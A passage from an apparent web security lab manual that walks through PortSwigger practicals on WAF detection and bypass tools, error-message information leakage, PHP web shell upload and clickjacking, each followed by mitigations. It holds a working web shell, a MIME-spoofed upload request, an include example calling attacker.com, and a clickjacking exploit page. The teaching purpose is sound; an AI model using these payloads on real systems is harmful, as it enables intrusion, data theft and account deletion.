+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token function" style=color:#d73a49>git</span><span class="token plain"> clone https://github.com/EnableSecurity/wafw00f.git</span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> wafw00f</span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">python3 setup.py </span><span class="token function" style=color:#d73a49>install</span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">wafw00f https://target-domain.com</span></span><br/></div></code></pre></div></div>
+</li>
+<li class="">Inspect detection output identifying vendors (e.g., Cloudflare, AWS WAF, Imperva, ModSecurity).</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Automated Evasion Testing with <code>WhatWaf</code></strong>:</p>
+<ul>
+<li class="">Clone and execute <code>WhatWaf</code>:<!-- -->
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token function" style=color:#d73a49>git</span><span class="token plain"> clone https://github.com/Ekultek/WhatWaf.git</span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> WhatWaf</span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">pip </span><span class="token function" style=color:#d73a49>install</span><span class="token plain"> </span><span class="token parameter variable" style=color:#36acaa>-r</span><span class="token plain"> requirements.txt</span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">./whatwaf </span><span class="token parameter variable" style=color:#36acaa>-u</span><span class="token plain"> </span><span class="token string" style=color:#e3116c>"https://target-domain.com/search.php?q=test"</span></span><br/></div></code></pre></div></div>
+</li>
+<li class="">The tool automatically attempts multiple tamper scripts (e.g., <code>between</code>, <code>charencode</code>, <code>space2comment</code>) to determine effective bypass techniques.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=54-mitigation>5.4 Mitigation<a href=#54-mitigation class=hash-link aria-label="Direct link to 5.4 Mitigation" title="Direct link to 5.4 Mitigation" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Normalize Inputs Before Inspection</strong>: WAFs must decode and canonicalize inputs prior to applying signature checks.</li>
+<li class=""><strong>Positive Security Model (Allowlisting)</strong>: Define strict schemas for input structure rather than relying solely on blacklists.</li>
+<li class=""><strong>Defense in Depth</strong>: WAFs should complement, never replace, secure coding standards.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=55-conclusion>5.5 Conclusion<a href=#55-conclusion class=hash-link aria-label="Direct link to 5.5 Conclusion" title="Direct link to 5.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Proved that signature-based WAF filtering can often be circumvented via encoding and keyword fragmentation, emphasizing that core security logic must reside within the application code.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=6-practical-6-information-leakage--sensitive-data-exposure>6. Practical 6: Information Leakage & Sensitive Data Exposure<a href=#6-practical-6-information-leakage--sensitive-data-exposure class=hash-link aria-label="Direct link to 6. Practical 6: Information Leakage & Sensitive Data Exposure" title="Direct link to 6. Practical 6: Information Leakage & Sensitive Data Exposure" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=61-aim>6.1 Aim<a href=#61-aim class=hash-link aria-label="Direct link to 6.1 Aim" title="Direct link to 6.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Identify and exploit vulnerabilities that unintentionally reveal sensitive configuration data, internal architecture, or technical credentials.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=62-theory--core-concepts>6.2 Theory & Core Concepts<a href=#62-theory--core-concepts class=hash-link aria-label="Direct link to 6.2 Theory & Core Concepts" title="Direct link to 6.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Information Leakage</strong>: The unintentional exposure of sensitive operational or technical data to unauthorized parties.</li>
+<li class=""><strong>Common Vectors</strong>:<!-- -->
+<ul>
+<li class="">Verbose error messages displaying full stack traces, database versions, and server paths.</li>
+<li class="">Publicly accessible configuration files (<code>.env</code>, <code>.git</code>, <code>web.config</code>, <code>phpinfo.php</code>).</li>
+<li class="">Unsanitized HTML comments containing developer notes and internal URLs.</li>
+<li class="">Server banner headers disclosing exact OS and daemon software versions.</li>
+</ul>
+</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=63-step-by-step-implementation-portswigger-lab>6.3 Step-by-Step Implementation (PortSwigger Lab)<a href=#63-step-by-step-implementation-portswigger-lab class=hash-link aria-label="Direct link to 6.3 Step-by-Step Implementation (PortSwigger Lab)" title="Direct link to 6.3 Step-by-Step Implementation (PortSwigger Lab)" translate=no>​</a></h3>
+<ol>
+<li class=""><strong>Lab Target</strong>: <em>Information disclosure in error messages</em>.</li>
+<li class=""><strong>Reconnaissance</strong>:<!-- -->
+<ul>
+<li class="">Launch Burp Suite and browse the lab target store.</li>
+<li class="">Select any product to view its details, capturing the request:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">GET /product?productId=1 HTTP/1.1</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Host: target-lab.web-security-academy.net</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class=""><strong>Triggering Unhandled Exceptions</strong>:<!-- -->
+<ul>
+<li class="">Send the request to <strong>Burp Repeater</strong>.</li>
+<li class="">Tamper with the parameter value by entering an unexpected non-numeric string:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">GET /product?productId=hacker HTTP/1.1</span><br/></div></code></pre></div></div>
+</li>
+<li class="">Transmit the request and examine the <strong>HTTP 500 Internal Server Error</strong> response.</li>
+</ul>
+</li>
+<li class=""><strong>Analyzing Exposed Stack Trace</strong>:<!-- -->
+<ul>
+<li class="">The response exposes a full debug stack trace disclosing internal framework libraries, runtime versions (e.g., Apache Struts / Spring Boot version), and absolute filesystem directory paths.</li>
+<li class="">Extract the required secret framework token from the stack trace and submit it to solve the lab.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=64-prevention>6.4 Prevention<a href=#64-prevention class=hash-link aria-label="Direct link to 6.4 Prevention" title="Direct link to 6.4 Prevention" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Custom Error Pages</strong>: Return generic error pages (e.g., standard 404/500 templates) without technical details.</li>
+<li class=""><strong>Disable Debug Mode in Production</strong>: Ensure <code>display_errors = Off</code> in <code>php.ini</code> or disable debug flags in application frameworks.</li>
+<li class=""><strong>Header Sanitization</strong>: Suppress <code>Server</code> and <code>X-Powered-By</code> headers.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=65-conclusion>6.5 Conclusion<a href=#65-conclusion class=hash-link aria-label="Direct link to 6.5 Conclusion" title="Direct link to 6.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Verified that unhandled exceptions provide attackers with valuable intelligence regarding internal software components, underscoring the necessity of centralized exception handling.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=7-practical-7-file-inclusion--web-shell-upload-attacks>7. Practical 7: File Inclusion & Web Shell Upload Attacks<a href=#7-practical-7-file-inclusion--web-shell-upload-attacks class=hash-link aria-label="Direct link to 7. Practical 7: File Inclusion & Web Shell Upload Attacks" title="Direct link to 7. Practical 7: File Inclusion & Web Shell Upload Attacks" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=71-aim>7.1 Aim<a href=#71-aim class=hash-link aria-label="Direct link to 7.1 Aim" title="Direct link to 7.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Demonstrate how file inclusion and unrestricted file upload vulnerabilities allow attackers to execute arbitrary server-side code (Remote Code Execution).</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=72-theory--core-concepts>7.2 Theory & Core Concepts<a href=#72-theory--core-concepts class=hash-link aria-label="Direct link to 7.2 Theory & Core Concepts" title="Direct link to 7.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Local File Inclusion (LFI)</strong>: Allows reading or including files locally present on the server via path manipulation (e.g., <code>include($_GET['page'])</code>).</li>
+<li class=""><strong>Remote File Inclusion (RFI)</strong>: Allows including and executing remote files hosted on attacker-controlled servers (e.g., <code>include("http://attacker.com/shell.txt")</code>).</li>
+<li class=""><strong>Unrestricted File Upload</strong>: Failure to validate file extensions, MIME types, or contents when uploading user assets (e.g., avatars), permitting executable scripts (<code>.php</code>, <code>.jsp</code>) to be uploaded directly into the web root.</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=73-step-by-step-implementation-portswigger-lab>7.3 Step-by-Step Implementation (PortSwigger Lab)<a href=#73-step-by-step-implementation-portswigger-lab class=hash-link aria-label="Direct link to 7.3 Step-by-Step Implementation (PortSwigger Lab)" title="Direct link to 7.3 Step-by-Step Implementation (PortSwigger Lab)" translate=no>​</a></h3>
+<ol>
+<li class=""><strong>Lab Target</strong>: <em>Remote code execution via web shell upload</em>.</li>
+<li class=""><strong>Uploading Base Profile Asset</strong>:<!-- -->
+<ul>
+<li class="">Log into the application using credentials (<code>wiener</code> / <code>peter</code>).</li>
+<li class="">Locate the avatar upload function.</li>
+<li class="">Upload an authentic image (<code>.png</code>) and verify through Burp HTTP History that the file is stored under <code>/files/avatars/</code>.</li>
+</ul>
+</li>
+<li class=""><strong>Crafting the PHP Web Shell</strong>:<!-- -->
+<ul>
+<li class="">Create a file named <code>exploit.php</code> containing server-side execution code:<!-- -->
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-php codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token delimiter important">&lt;?php</span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token keyword" style=color:#00009f>echo</span><span class="token plain"> </span><span class="token function" style=color:#d73a49>file_get_contents</span><span class="token punctuation" style=color:#393A34>(</span><span class="token string single-quoted-string" style=color:#e3116c>'/home/carlos/secret'</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token delimiter important">?></span></span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class=""><strong>Bypassing Upload Restrictions</strong>:<!-- -->
+<ul>
+<li class="">Upload <code>exploit.php</code> through the avatar form.</li>
+<li class="">If MIME type filtering is enabled, intercept the multipart upload request in Burp Suite and ensure the <code>Content-Type</code> header matches an allowed type:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">Content-Disposition: form-data; name="avatar"; filename="exploit.php"</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Content-Type: image/jpeg</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class=""><strong>Executing the Shell & Retrieving Data</strong>:<!-- -->
+<ul>
+<li class="">In Burp Repeater, issue a GET request directly to the uploaded file:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">GET /files/avatars/exploit.php HTTP/1.1</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Host: target-lab.web-security-academy.net</span><br/></div></code></pre></div></div>
+</li>
+<li class="">The web server executes the PHP file and returns the secret key in the response body.</li>
+<li class="">Submit the extracted secret key to solve the lab.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=74-mitigation-strategies>7.4 Mitigation Strategies<a href=#74-mitigation-strategies class=hash-link aria-label="Direct link to 7.4 Mitigation Strategies" title="Direct link to 7.4 Mitigation Strategies" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Extension Allowlisting</strong>: Restrict accepted file extensions strictly to safe non-executable formats (e.g., <code>.jpg</code>, <code>.png</code>).</li>
+<li class=""><strong>MIME & Magic Byte Verification</strong>: Validate actual file headers (magic bytes) rather than relying solely on user-supplied filenames.</li>
+<li class=""><strong>Separate Storage Domain / Outside Web Root</strong>: Store uploaded files outside the public document root or serve them from an isolated S3 bucket/CDN.</li>
+<li class=""><strong>Disable Script Execution</strong>: Configure web server rules to deny script execution in upload folders:<!-- -->
+<div class="language-apache codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-apache codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">&lt;Directory "/var/www/uploads"></span><br/></div><div class=token-line style=color:#393A34><span class="token plain">    php_flag engine off</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">&lt;/Directory></span><br/></div></code></pre></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=75-conclusion>7.5 Conclusion<a href=#75-conclusion class=hash-link aria-label="Direct link to 7.5 Conclusion" title="Direct link to 7.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Demonstrated how arbitrary file upload vulnerabilities directly lead to full Remote Code Execution (RCE). Defensive controls must strictly decouple user-uploaded content from server-side script execution engines.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=8-practical-8-clickjacking-ui-redressing-attacks>8. Practical 8: Clickjacking (UI Redressing) Attacks<a href=#8-practical-8-clickjacking-ui-redressing-attacks class=hash-link aria-label="Direct link to 8. Practical 8: Clickjacking (UI Redressing) Attacks" title="Direct link to 8. Practical 8: Clickjacking (UI Redressing) Attacks" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=81-aim>8.1 Aim<a href=#81-aim class=hash-link aria-label="Direct link to 8.1 Aim" title="Direct link to 8.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Construct a Clickjacking exploit using CSS opacity tricks and iframe layering to trick an authenticated user into clicking an unintended, high-privilege button.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=82-theory--core-concepts>8.2 Theory & Core Concepts<a href=#82-theory--core-concepts class=hash-link aria-label="Direct link to 8.2 Theory & Core Concepts" title="Direct link to 8.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Clickjacking (UI Redressing)</strong>: An interface-based attack in which a transparent <code>&lt;iframe></code> containing a target application is overlaid directly on top of a decoy webpage.</li>
+<li class=""><strong>Mechanism</strong>:<!-- -->
+<ul>
+<li class="">The victim is lured to the attacker's decoy site (e.g., "Click here to win a prize").</li>
+<li class="">The attacker embeds the target website inside an invisible iframe (<code>opacity: 0.0001</code>) layered above the decoy using CSS <code>z-index</code>.</li>
+<li class="">When the user clicks the apparent decoy button, they unwittingly click an actionable button (e.g., "Delete Account", "Authorize Payment") on the embedded target application.</li>
+</ul>
+</li>
+<li class=""><strong>Clickjacking vs. CSRF</strong>:<!-- -->
+<ul>
+<li class="">CSRF executes without user interaction by forging a background request.</li>
+<li class="">Clickjacking relies on deceptive UI manipulation to induce the user into physically clicking the coordinate where the action button resides.</li>
+</ul>
+</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=83-step-by-step-implementation-portswigger-lab>8.3 Step-by-Step Implementation (PortSwigger Lab)<a href=#83-step-by-step-implementation-portswigger-lab class=hash-link aria-label="Direct link to 8.3 Step-by-Step Implementation (PortSwigger Lab)" title="Direct link to 8.3 Step-by-Step Implementation (PortSwigger Lab)" translate=no>​</a></h3>
+<ol>
+<li class=""><strong>Lab Target</strong>: <em>Basic clickjacking with CSRF token protection</em>.</li>
+<li class=""><strong>Accessing the Target</strong>:<!-- -->
+<ul>
+<li class="">Access the lab and log in with account credentials (<code>wiener</code> / <code>peter</code>).</li>
+<li class="">Notice the sensitive state-changing action: <strong>Delete account</strong> button located on the <code>/my-account</code> page.</li>
+</ul>
+</li>
+<li class=""><strong>Crafting the Exploit Template</strong>:<!-- -->
+<ul>
+<li class="">Navigate to the <strong>Exploit Server</strong> and draft the HTML exploit page:<!-- -->
+<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-html codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>head</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">  </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>style</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">    </span><span class="token style language-css selector id" style=color:#00009f>#target_website</span><span class="token style language-css"> </span><span class="token style language-css punctuation" style=color:#393A34>{</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>position</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> relative</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>width</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>500</span><span class="token style language-css unit">px</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>height</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>700</span><span class="token style language-css unit">px</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>opacity</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>0.0001</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>z-index</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>2</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">    </span><span class="token style language-css punctuation" style=color:#393A34>}</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">    </span><span class="token style language-css selector id" style=color:#00009f>#decoy_button</span><span class="token style language-css"> </span><span class="token style language-css punctuation" style=color:#393A34>{</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>position</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> absolute</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>top</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>585</span><span class="token style language-css unit">px</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>left</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>55</span><span class="token style language-css unit">px</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">      </span><span class="token style language-css property" style=color:#36acaa>z-index</span><span class="token style language-css punctuation" style=color:#393A34>:</span><span class="token style language-css"> </span><span class="token style language-css number" style=color:#36acaa>1</span><span class="token style language-css punctuation" style=color:#393A34>;</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">    </span><span class="token style language-css punctuation" style=color:#393A34>}</span><span class="token style language-css"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token style language-css">  </span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>style</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>head</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>body</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">  </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>div</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>id</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>decoy_button</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain">Click here to claim reward</span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>div</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">  </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>iframe</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>id</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>target_website</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>src</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>https://target-lab.web-security-academy.net/my-account</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>iframe</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>body</span><span class="token tag punctuation" style=color:#393A34>></span></span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class=""><strong>Aligning & Delivering Exploit</strong>:<!-- -->
+<ul>
+<li class="">Adjust <code>top</code> and <code>left</code> pixel coordinates so the decoy button precisely aligns beneath the invisible "Delete account" button in the iframe.</li>
+<li class="">Click <strong>Store</strong>, then <strong>Deliver exploit to victim</strong>.</li>
+<li class="">The simulated victim visits the decoy page, clicks the decoy button, and unwittingly triggers account deletion.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=84-mitigation-strategies>8.4 Mitigation Strategies<a href=#84-mitigation-strategies class=hash-link aria-label="Direct link to 8.4 Mitigation Strategies" title="Direct link to 8.4 Mitigation Strategies" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Content Security Policy (CSP) <code>frame-ancestors</code></strong>:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">Content-Security-Policy: frame-ancestors 'none';</span><br/></div></code></pre></div></div>
+<!-- -->This directive tells compliant browsers never to embed the page inside an <code>&lt;iframe></code>.</li>
+<li class=""><strong><code>X-Frame-Options</code> Header</strong>:<!-- -->
